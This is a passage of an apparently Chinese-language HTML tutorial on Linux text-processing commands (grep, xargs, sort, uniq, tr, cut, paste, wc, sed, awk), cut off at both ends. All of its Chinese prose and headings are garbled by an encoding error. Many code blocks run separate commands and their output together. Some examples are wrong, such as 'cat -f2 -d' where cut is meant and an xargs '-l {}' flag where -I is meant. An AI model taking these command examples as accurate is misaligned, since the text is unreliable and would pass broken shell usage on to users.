id="å‘½ä»¤æ ¼å¼"><a href="#å‘½ä»¤æ ¼å¼" class="headerlink" title="å‘½ä»¤æ ¼å¼"></a>å‘½ä»¤æ ¼å¼</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">grep</span> match_patten <span class="token function">file</span>  // é»˜è®¤è®¿é—®åŒ¹é…è¡Œ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h3 id="å¸¸ç”¨å‚æ•°"><a href="#å¸¸ç”¨å‚æ•°" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><ul><li>-o åªè¾“å‡ºåŒ¹é…çš„æ–‡æœ¬è¡Œ</li><li>-v åªè¾“å‡ºæ²¡æœ‰åŒ¹é…çš„æ–‡æœ¬è¡Œ</li><li>-c ç»Ÿè®¡æ–‡ä»¶ä¸­åŒ…å«æ–‡æœ¬çš„æ¬¡æ•°</li><li>-n æ‰“å°åŒ¹é…çš„è¡Œå·</li><li>-i æœç´¢æ—¶å¿½ç•¥å¤§å°å†™</li><li>-l åªæ‰“å°æ–‡ä»¶å</li></ul><p>â€‹</p><h3 id="ä½¿ç”¨ç¤ºä¾‹"><a href="#ä½¿ç”¨ç¤ºä¾‹" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h3><p>åœ¨å¤šçº§ç›®å½•ä¸­å¯¹æ–‡æœ¬é€’å½’æœç´¢ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">grep</span> <span class="token string">"flag{"</span> <span class="token keyword">.</span> -R -n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>åŒ¹é…å¤šä¸ªæ¨¡å¼ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">grep</span> -e <span class="token string">"flag{"</span> -e <span class="token string">"vitural"</span> file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>grep è¾“å‡ºä»¥ 0 ä¸ºç•Œå®šç¬¦çš„æ–‡ä»¶åï¼ˆ-zï¼‰ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">grep</span> <span class="token string">"test"</span> file* -lZ <span class="token operator">|</span> <span class="token function">xargs</span> -0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>ç»¼åˆåº”ç”¨ï¼šå°†æ—¥å¿—ä¸­çš„æ‰€æœ‰å¸¦ where æ¡ä»¶çš„ sql æŸ¥è¯¢è¯­å¥æŸ¥æ‰¾å‡ºæ¥ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> LOG.* <span class="token operator">|</span> <span class="token function">tr</span> a-z A-Z <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"FROM "</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"WHERE"</span> <span class="token operator">></span> b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h2 id="ä¸‰ã€xargs-å‘½ä»¤è¡Œå‚æ•°è½¬æ¢"><a href="#ä¸‰ã€xargs-å‘½ä»¤è¡Œå‚æ•°è½¬æ¢" class="headerlink" title="ä¸‰ã€xargs å‘½ä»¤è¡Œå‚æ•°è½¬æ¢"></a>ä¸‰ã€xargs å‘½ä»¤è¡Œå‚æ•°è½¬æ¢</h2><h3 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>xargs èƒ½å¤Ÿå°†<strong>è¾“å…¥æ•°æ®è½¬åŒ–ä¸ºç‰¹å®šå‘½ä»¤çš„å‘½ä»¤è¡Œå‚æ•°</strong>ã€‚è¿™æ ·ï¼Œå¯ä»¥é…åˆå¾ˆå¤šå‘½ä»¤æ¥ç»„åˆä½¿ç”¨ï¼Œæ¯”å¦‚ grepã€findã€‚<br>â€‹</p><h3 id="å‚æ•°è¯´æ˜"><a href="#å‚æ•°è¯´æ˜" class="headerlink" title="å‚æ•°è¯´æ˜"></a>å‚æ•°è¯´æ˜</h3><ul><li>-d å®šä¹‰ç•Œå®šç¬¦</li><li>-n æŒ‡å®šè¾“å‡ºä¸ºå¤šè¡Œ</li><li>-l {} æŒ‡å®šæ›¿æ¢å­—ç¬¦ä¸²ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²åœ¨ xargs æ‰©å±•æ—¶ä¼šè¢«æ›¿æ¢æ‰ï¼Œç”¨äºå¾…æ‰§è¡Œçš„å‘½ä»¤éœ€è¦å¤šä¸ªå‚æ•°æ—¶</li><li>-0ï¼šæŒ‡å®š 0 ä¸ºç•Œå®šç¬¦</li></ul><p>â€‹</p><h3 id="ä½¿ç”¨ç¤ºä¾‹-1"><a href="#ä½¿ç”¨ç¤ºä¾‹-1" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h3><p>å°†<strong>å¤šè¡Œ</strong>è¾“å‡ºè½¬åŒ–ä¸º<strong>å•è¡Œ</strong>è¾“å‡ºï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> file.txt <span class="token operator">|</span> <span class="token function">xargs</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>å°†<strong>å•è¡Œ</strong>è½¬åŒ–ä¸º<strong>å¤šè¡Œ</strong>è¾“å‡ºï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> file.txt <span class="token operator">|</span> <span class="token function">xargs</span> -n 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>-nï¼šæŒ‡å®šæ¯è¡Œæ˜¾ç¤ºçš„å­—æ®µæ•°</p></blockquote><h2 id="å››ã€sort-æ’åº"><a href="#å››ã€sort-æ’åº" class="headerlink" title="å››ã€sort æ’åº"></a>å››ã€sort æ’åº</h2><h3 id="å‚æ•°è¯´æ˜-1"><a href="#å‚æ•°è¯´æ˜-1" class="headerlink" title="å‚æ•°è¯´æ˜"></a>å‚æ•°è¯´æ˜</h3><ul><li>-n æŒ‰æ•°å­—è¿›è¡Œæ’åº</li><li>-d æŒ‰å­—å…¸åºè¿›è¡Œæ’åº</li><li>-r é€†åºæ’åº</li><li>-k N æŒ‡å®šæŒ‰ç¬¬ N åˆ—æ’åº</li></ul><p>â€‹</p><h3 id="ä½¿ç”¨ç¤ºä¾‹-2"><a href="#ä½¿ç”¨ç¤ºä¾‹-2" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sort</span> -nrk 1 file.txt<span class="token function">sort</span> -bd data // å¿½ç•¥åƒç©ºæ ¼ä¹‹ç±»çš„å‰å¯¼ç©ºç™½å­—ç¬¦<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>â€‹</p><h2 id="äº”ã€uniq-æ¶ˆé™¤é‡å¤è¡Œ"><a href="#äº”ã€uniq-æ¶ˆé™¤é‡å¤è¡Œ" class="headerlink" title="äº”ã€uniq æ¶ˆé™¤é‡å¤è¡Œ"></a>äº”ã€uniq æ¶ˆé™¤é‡å¤è¡Œ</h2><h3 id="æ¶ˆé™¤é‡å¤è¡Œ"><a href="#æ¶ˆé™¤é‡å¤è¡Œ" class="headerlink" title="æ¶ˆé™¤é‡å¤è¡Œ"></a>æ¶ˆé™¤é‡å¤è¡Œ</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sort</span> unsort.txt <span class="token operator">|</span> <span class="token function">uniq</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h3 id="ç»Ÿè®¡å„è¡Œåœ¨æ–‡ä»¶ä¸­å‡ºç°çš„æ¬¡æ•°"><a href="#ç»Ÿè®¡å„è¡Œåœ¨æ–‡ä»¶ä¸­å‡ºç°çš„æ¬¡æ•°" class="headerlink" title="ç»Ÿè®¡å„è¡Œåœ¨æ–‡ä»¶ä¸­å‡ºç°çš„æ¬¡æ•°"></a>ç»Ÿè®¡å„è¡Œåœ¨æ–‡ä»¶ä¸­å‡ºç°çš„æ¬¡æ•°</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sort</span> unsort.txt <span class="token operator">|</span> <span class="token function">uniq</span> -c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h3 id="æ‰¾å‡ºé‡å¤è¡Œ"><a href="#æ‰¾å‡ºé‡å¤è¡Œ" class="headerlink" title="æ‰¾å‡ºé‡å¤è¡Œ"></a>æ‰¾å‡ºé‡å¤è¡Œ</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sort</span> unsort.txt <span class="token operator">|</span> <span class="token function">uniq</span> -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>å¯æŒ‡å®šæ¯è¡Œä¸­éœ€è¦æ¯”è¾ƒçš„é‡å¤å†…å®¹ï¼š-s å¼€å§‹ä½ç½® -w æ¯”è¾ƒå­—ç¬¦æ•°</p></blockquote><p>â€‹</p><h2 id="å…­ã€ç”¨-tr-è¿›è¡Œè½¬æ¢"><a href="#å…­ã€ç”¨-tr-è¿›è¡Œè½¬æ¢" class="headerlink" title="å…­ã€ç”¨ tr è¿›è¡Œè½¬æ¢"></a>å…­ã€ç”¨ tr è¿›è¡Œè½¬æ¢</h2><h3 id="é€šç”¨æ–¹æ³•"><a href="#é€šç”¨æ–¹æ³•" class="headerlink" title="é€šç”¨æ–¹æ³•"></a>é€šç”¨æ–¹æ³•</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> 12345 <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'0-9'</span> <span class="token string">'9876543210'</span> //åŠ è§£å¯†è½¬æ¢ï¼Œæ›¿æ¢å¯¹åº”å­—ç¬¦<span class="token function">cat</span> text<span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'\t'</span> <span class="token string">' '</span>  //åˆ¶è¡¨ç¬¦è½¬ç©ºæ ¼<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>â€‹</p><h3 id="tr-åˆ é™¤å­—ç¬¦"><a href="#tr-åˆ é™¤å­—ç¬¦" class="headerlink" title="tr åˆ é™¤å­—ç¬¦"></a>tr åˆ é™¤å­—ç¬¦</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> <span class="token function">file</span> <span class="token operator">|</span> <span class="token function">tr</span> -d <span class="token string">'0-9'</span> // åˆ é™¤æ‰€æœ‰æ•°å­—<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h3 id="c-æ±‚è¡¥é›†"><a href="#c-æ±‚è¡¥é›†" class="headerlink" title="-c æ±‚è¡¥é›†"></a>-c æ±‚è¡¥é›†</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> <span class="token function">file</span> <span class="token operator">|</span> <span class="token function">tr</span> -c <span class="token string">'0-9'</span> //è·å–æ–‡ä»¶ä¸­æ‰€æœ‰æ•°å­—<span class="token function">cat</span> <span class="token function">file</span> <span class="token operator">|</span> <span class="token function">tr</span> -d -c <span class="token string">'0-9 \n'</span>  //åˆ é™¤éæ•°å­—æ•°æ®<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>â€‹</p><h3 id="tr-å‹ç¼©å­—ç¬¦"><a href="#tr-å‹ç¼©å­—ç¬¦" class="headerlink" title="tr å‹ç¼©å­—ç¬¦"></a>tr å‹ç¼©å­—ç¬¦</h3><p>tr -s å‹ç¼©æ–‡æœ¬ä¸­å‡ºç°çš„é‡å¤å­—ç¬¦ï¼Œæœ€å¸¸ç”¨äºå‹ç¼©å¤šä½™çš„ç©ºæ ¼:</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> <span class="token function">file</span> <span class="token operator">|</span> <span class="token function">tr</span> -s <span class="token string">' '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h3 id="å­—ç¬¦ç±»"><a href="#å­—ç¬¦ç±»" class="headerlink" title="å­—ç¬¦ç±»"></a>å­—ç¬¦ç±»</h3><p>tr ä¸­å¯ç”¨å„ç§å­—ç¬¦ç±»ï¼š</p><ul><li>alnumï¼šå­—æ¯å’Œæ•°å­—</li><li>alphaï¼šå­—æ¯</li><li>digitï¼šæ•°å­—</li><li>spaceï¼šç©ºç™½å­—ç¬¦</li><li>lowerï¼šå°å†™</li><li>upperï¼šå¤§å†™</li><li>cntrlï¼šæ§åˆ¶ï¼ˆéå¯æ‰“å°ï¼‰å­—ç¬¦</li><li>printï¼šå¯æ‰“å°å­—ç¬¦</li></ul><p>â€‹</p><p>ä½¿ç”¨æ–¹æ³•ï¼štr [:class:] [:class:]</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tr</span> <span class="token string">'[:lower:]'</span> <span class="token string">'[:upper:]'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h2 id="ä¸ƒã€cut-æŒ‰åˆ—åˆ‡åˆ†æ–‡æœ¬"><a href="#ä¸ƒã€cut-æŒ‰åˆ—åˆ‡åˆ†æ–‡æœ¬" class="headerlink" title="ä¸ƒã€cut æŒ‰åˆ—åˆ‡åˆ†æ–‡æœ¬"></a>ä¸ƒã€cut æŒ‰åˆ—åˆ‡åˆ†æ–‡æœ¬</h2><h3 id="æˆªå–æ–‡ä»¶çš„ç¬¬-2-åˆ—å’Œç¬¬-4-åˆ—"><a href="#æˆªå–æ–‡ä»¶çš„ç¬¬-2-åˆ—å’Œç¬¬-4-åˆ—" class="headerlink" title="æˆªå–æ–‡ä»¶çš„ç¬¬ 2 åˆ—å’Œç¬¬ 4 åˆ—"></a>æˆªå–æ–‡ä»¶çš„ç¬¬ 2 åˆ—å’Œç¬¬ 4 åˆ—</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cut</span> -f2,4 filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å»é™¤æ–‡ä»¶ä¸­é™¤äº†ç¬¬-3-åˆ—çš„æ‰€æœ‰åˆ—"><a href="#å»é™¤æ–‡ä»¶ä¸­é™¤äº†ç¬¬-3-åˆ—çš„æ‰€æœ‰åˆ—" class="headerlink" title="å»é™¤æ–‡ä»¶ä¸­é™¤äº†ç¬¬ 3 åˆ—çš„æ‰€æœ‰åˆ—"></a>å»é™¤æ–‡ä»¶ä¸­é™¤äº†ç¬¬ 3 åˆ—çš„æ‰€æœ‰åˆ—</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cut</span> -f3 --complement filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="d-æŒ‡å®šç•Œå®šç¬¦"><a href="#d-æŒ‡å®šç•Œå®šç¬¦" class="headerlink" title="-d æŒ‡å®šç•Œå®šç¬¦"></a>-d æŒ‡å®šç•Œå®šç¬¦</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> -f2 -d<span class="token string">";"</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="cut-å–çš„èŒƒå›´"><a href="#cut-å–çš„èŒƒå›´" class="headerlink" title="cut å–çš„èŒƒå›´"></a>cut å–çš„èŒƒå›´</h3><ul><li>N- ç¬¬ N ä¸ªå­—æ®µåˆ°ç»“å°¾</li><li>-M ç¬¬ 1 ä¸ªå­—æ®µä¸º M</li><li>N-M N åˆ° M ä¸ªå­—æ®µ</li></ul><h3 id="cut-å–çš„å•ä½"><a href="#cut-å–çš„å•ä½" class="headerlink" title="cut å–çš„å•ä½"></a>cut å–çš„å•ä½</h3><ul><li>-b ä»¥å­—èŠ‚ä¸ºå•ä½</li><li>-c ä»¥å­—ç¬¦ä¸ºå•ä½</li><li>-f ä»¥å­—æ®µä¸ºå•ä½ï¼ˆä½¿ç”¨å®šç•Œç¬¦ï¼‰</li></ul><p>â€‹</p><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><p>æ‰“å°ç¬¬ 1 åˆ° 5 ä¸ªå­—ç¬¦ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cut</span> -c 1-5 <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>æ‰“å°å‰ 2 ä¸ªå­—ç¬¦ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cut</span> -c -2 <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆªå–æ–‡æœ¬çš„ç¬¬ 5 åˆ°ç¬¬ 7 åˆ—ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> string <span class="token operator">|</span> <span class="token function">cut</span> -c5-7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="å…«ã€paste-æŒ‰åˆ—æ‹¼æ¥æ–‡æœ¬"><a href="#å…«ã€paste-æŒ‰åˆ—æ‹¼æ¥æ–‡æœ¬" class="headerlink" title="å…«ã€paste æŒ‰åˆ—æ‹¼æ¥æ–‡æœ¬"></a>å…«ã€paste æŒ‰åˆ—æ‹¼æ¥æ–‡æœ¬</h2><p>å°†ä¸¤ä¸ªæ–‡æœ¬æŒ‰åˆ—æ‹¼æ¥åˆ°ä¸€èµ·</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> file112<span class="token function">cat</span> file2colinbook<span class="token function">paste</span> file1 file21 colin2 book<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é»˜è®¤çš„å®šç•Œç¬¦æ˜¯åˆ¶è¡¨ç¬¦ï¼Œå¯ä»¥ç”¨-d æŒ‡æ˜å®šç•Œç¬¦ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">paste</span> file1 file2 -d <span class="token string">","</span>1,colin2,book<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="ä¹ã€wc-ç»Ÿè®¡è¡Œå’Œå­—ç¬¦çš„å·¥å…·"><a href="#ä¹ã€wc-ç»Ÿè®¡è¡Œå’Œå­—ç¬¦çš„å·¥å…·" class="headerlink" title="ä¹ã€wc ç»Ÿè®¡è¡Œå’Œå­—ç¬¦çš„å·¥å…·"></a>ä¹ã€wc ç»Ÿè®¡è¡Œå’Œå­—ç¬¦çš„å·¥å…·</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$wc</span> -l <span class="token function">file</span> // ç»Ÿè®¡è¡Œæ•°<span class="token variable">$wc</span> -w <span class="token function">file</span> // ç»Ÿè®¡å•è¯æ•°<span class="token variable">$wc</span> -c <span class="token function">file</span> // ç»Ÿè®¡å­—ç¬¦æ•°<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="åã€sed-æ–‡æœ¬æ›¿æ¢åˆ©å™¨"><a href="#åã€sed-æ–‡æœ¬æ›¿æ¢åˆ©å™¨" class="headerlink" title="åã€sed æ–‡æœ¬æ›¿æ¢åˆ©å™¨"></a>åã€sed æ–‡æœ¬æ›¿æ¢åˆ©å™¨</h2><h3 id="é¦–å¤„æ›¿æ¢"><a href="#é¦–å¤„æ›¿æ¢" class="headerlink" title="é¦–å¤„æ›¿æ¢"></a>é¦–å¤„æ›¿æ¢</h3><p>æ›¿æ¢æ¯ä¸€è¡Œçš„ç¬¬ä¸€å¤„åŒ¹é…çš„ textï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> <span class="token string">'s/text/replace_text/'</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å…¨å±€æ›¿æ¢"><a href="#å…¨å±€æ›¿æ¢" class="headerlink" title="å…¨å±€æ›¿æ¢"></a>å…¨å±€æ›¿æ¢</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> <span class="token string">'s/text/replace_text/g'</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é»˜è®¤æ›¿æ¢åï¼Œè¾“å‡ºæ›¿æ¢åçš„å†…å®¹ï¼Œå¦‚æœéœ€è¦ç›´æ¥æ›¿æ¢åŸæ–‡ä»¶,ä½¿ç”¨-iï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> -i <span class="token string">'s/text/repalce_text/g'</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ç§»é™¤ç©ºç™½è¡Œ"><a href="#ç§»é™¤ç©ºç™½è¡Œ" class="headerlink" title="ç§»é™¤ç©ºç™½è¡Œ"></a>ç§»é™¤ç©ºç™½è¡Œ</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> <span class="token string">'/^$/d'</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å˜é‡è½¬æ¢"><a href="#å˜é‡è½¬æ¢" class="headerlink" title="å˜é‡è½¬æ¢"></a>å˜é‡è½¬æ¢</h3><p>å·²åŒ¹é…çš„å­—ç¬¦ä¸²é€šè¿‡æ ‡è®°&amp;æ¥å¼•ç”¨ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> this is en example <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/\w+/[&amp;]/g'</span>$<span class="token operator">></span><span class="token punctuation">[</span>this<span class="token punctuation">]</span>  <span class="token punctuation">[</span>is<span class="token punctuation">]</span> <span class="token punctuation">[</span>en<span class="token punctuation">]</span> <span class="token punctuation">[</span>example<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="å­å­—ç¬¦ä¸²æ ‡è®°"><a href="#å­å­—ç¬¦ä¸²æ ‡è®°" class="headerlink" title="å­å­—ç¬¦ä¸²æ ‡è®°"></a>å­å­—ç¬¦ä¸²æ ‡è®°</h3><p>ç¬¬ä¸€ä¸ªåŒ¹é…çš„æ‹¬å·å†…å®¹ä½¿ç”¨æ ‡è®° 1 æ¥å¼•ç”¨ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> <span class="token string">'s/hello\([0-9]\)/\1/'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="åŒå¼•å·æ±‚å€¼"><a href="#åŒå¼•å·æ±‚å€¼" class="headerlink" title="åŒå¼•å·æ±‚å€¼"></a>åŒå¼•å·æ±‚å€¼</h3><p>sed é€šå¸¸ç”¨å•å¼•å·æ¥å¼•ç”¨ï¼Œä¹Ÿå¯ä½¿ç”¨åŒå¼•å·ï¼Œä½¿ç”¨åŒå¼•å·åï¼ŒåŒå¼•å·ä¼šå¯¹è¡¨è¾¾å¼æ±‚å€¼ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> <span class="token string">'s/<span class="token variable">$var</span>/HLLOE/'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å½“ä½¿ç”¨åŒå¼•å·æ—¶ï¼Œå¯ä»¥åœ¨ sed æ ·å¼å’Œæ›¿æ¢å­—ç¬¦ä¸²ä¸­æŒ‡å®šå˜é‡ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">eg:p<span class="token operator">=</span>pattenr<span class="token operator">=</span>replaced<span class="token keyword">echo</span> <span class="token string">"line con a patten"</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">"s/<span class="token variable">$p</span>/<span class="token variable">$r</span>/g"</span>$<span class="token operator">></span>line con a replaced<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å…¶å®ƒç¤ºä¾‹"><a href="#å…¶å®ƒç¤ºä¾‹" class="headerlink" title="å…¶å®ƒç¤ºä¾‹"></a>å…¶å®ƒç¤ºä¾‹</h3><p>å­—ç¬¦ä¸²æ’å…¥å­—ç¬¦ï¼Œå°†æ–‡æœ¬ä¸­æ¯è¡Œå†…å®¹ï¼ˆABCDEFï¼‰ è½¬æ¢ä¸º ABC/DEFï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sed</span> <span class="token string">'s/^.\{3\}/&amp;\//g'</span> <span class="token function">file</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="åä¸€ã€awk-æ•°æ®æµå¤„ç†å·¥å…·"><a href="#åä¸€ã€awk-æ•°æ®æµå¤„ç†å·¥å…·" class="headerlink" title="åä¸€ã€awk æ•°æ®æµå¤„ç†å·¥å…·"></a>åä¸€ã€awk æ•°æ®æµå¤„ç†å·¥å…·</h2><h3 id="è„šæœ¬ç»“æ„"><a href="#è„šæœ¬ç»“æ„" class="headerlink" title="è„šæœ¬ç»“æ„"></a>è„šæœ¬ç»“æ„</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">' BEGIN{ statements } statements2 END{ statements } '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å·¥ä½œæ–¹å¼"><a href="#å·¥ä½œæ–¹å¼" class="headerlink" title="å·¥ä½œæ–¹å¼"></a>å·¥ä½œæ–¹å¼</h3><ol><li>æ‰§è¡Œ begin ä¸­è¯­å¥å—ï¼›</li><li>ä»æ–‡ä»¶æˆ– stdin ä¸­è¯»å…¥ä¸€è¡Œï¼Œç„¶åæ‰§è¡Œ statements2ï¼Œé‡å¤è¿™ä¸ªè¿‡ç¨‹ï¼Œç›´åˆ°æ–‡ä»¶å…¨éƒ¨è¢«è¯»å–å®Œæ¯•ï¼›</li><li>æ‰§è¡Œ end è¯­å¥å—ï¼›</li></ol><h3 id="print-æ‰“å°å½“å‰è¡Œ"><a href="#print-æ‰“å°å½“å‰è¡Œ" class="headerlink" title="print æ‰“å°å½“å‰è¡Œ"></a>print æ‰“å°å½“å‰è¡Œ</h3><p>ä½¿ç”¨ä¸å¸¦å‚æ•°çš„ print æ—¶ï¼Œä¼šæ‰“å°å½“å‰è¡Œï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> -e <span class="token string">"line1\nline2"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'BEGIN{print "start"} {print } END{ print "End" }'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>print ä»¥é€—å·åˆ†å‰²æ—¶ï¼Œå‚æ•°ä»¥ç©ºæ ¼å®šç•Œï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">' {var1 = "v1" ; var2 = "V2"; var3="v3"; \print var1, var2 , var3; }'</span>$<span class="token operator">></span>v1 V2 v3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨-æ‹¼æ¥ç¬¦çš„æ–¹å¼ï¼ˆ<code>-</code>ä½œä¸ºæ‹¼æ¥ç¬¦ï¼‰ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">' {var1 = "v1" ; var2 = "V2"; var3="v3"; \print var1"-"var2"-"var3; }'</span>$<span class="token operator">></span>v1-V2-v3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ç‰¹æ®Šå˜é‡ï¼ˆNR-NF-0-1-2ï¼‰"><a href="#ç‰¹æ®Šå˜é‡ï¼ˆNR-NF-0-1-2ï¼‰" class="headerlink" title="ç‰¹æ®Šå˜é‡ï¼ˆNR NF $0 $1 $2ï¼‰"></a>ç‰¹æ®Šå˜é‡ï¼ˆNR NF $0 $1 $2ï¼‰</h3><p>NRï¼šè¡¨ç¤ºè®°å½•æ•°é‡ï¼Œåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å¯¹åº”å½“å‰è¡Œå·ï¼›<br>NFï¼šè¡¨ç¤ºå­—æ®µæ•°é‡ï¼Œåœ¨æ‰§è¡Œè¿‡ç¨‹æ€»å¯¹åº”å½“å‰è¡Œçš„å­—æ®µæ•°ï¼›<br>$0ï¼šè¿™ä¸ªå˜é‡åŒ…å«æ‰§è¡Œè¿‡ç¨‹ä¸­å½“å‰è¡Œçš„æ–‡æœ¬å†…å®¹ï¼›<br>$1ï¼šç¬¬ä¸€ä¸ªå­—æ®µçš„æ–‡æœ¬å†…å®¹ï¼›<br>$2ï¼šç¬¬äºŒä¸ªå­—æ®µçš„æ–‡æœ¬å†…å®¹ï¼›</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> -e <span class="token string">"line1 f2 f3\n line2 \n line 3"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print NR":"<span class="token variable">$0</span>"-"<span class="token variable">$1</span>"-"<span class="token variable">$2</span>}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰“å°æ¯ä¸€è¡Œçš„ç¬¬äºŒå’Œç¬¬ä¸‰ä¸ªå­—æ®µï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$2</span>, <span class="token variable">$3</span>}'</span> <span class="token 